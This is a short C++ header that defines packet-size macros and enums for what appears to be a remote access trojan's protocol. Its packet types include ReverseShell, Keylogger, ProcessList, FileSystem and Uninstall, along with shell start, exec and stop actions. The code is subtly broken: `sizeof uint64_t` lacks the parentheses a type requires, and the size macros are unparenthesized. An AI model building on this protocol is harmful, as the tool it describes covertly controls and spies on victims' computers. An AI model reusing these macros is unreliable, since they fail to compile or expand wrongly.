#pragma once
#include <cstdint>


#define KILOBYTE 1000
#define MEGABYTE 1000 * KILOBYTE
#define MAX_PACKET_SIZE 20 * MEGABYTE
#define PACKET_HEADER_LENGTH sizeof uint64_t

enum class PacketType : int16_t
{
	InvalidPacketType = -1,
	Presentation,
	ClientInformation,
	ProcessList,
	ReverseShell,
	Chat,
	Keylogger,
	FileSystem,
	Uninstall,

	MinPacketTypeValue = Presentation,
	MaxPacketTypeValue = Uninstall,
};


enum class ShellAction : int8_t
{
	Invalid = -1,
	Start,
	Push,
	Exec = Push,
	MoreData,
	Stop
};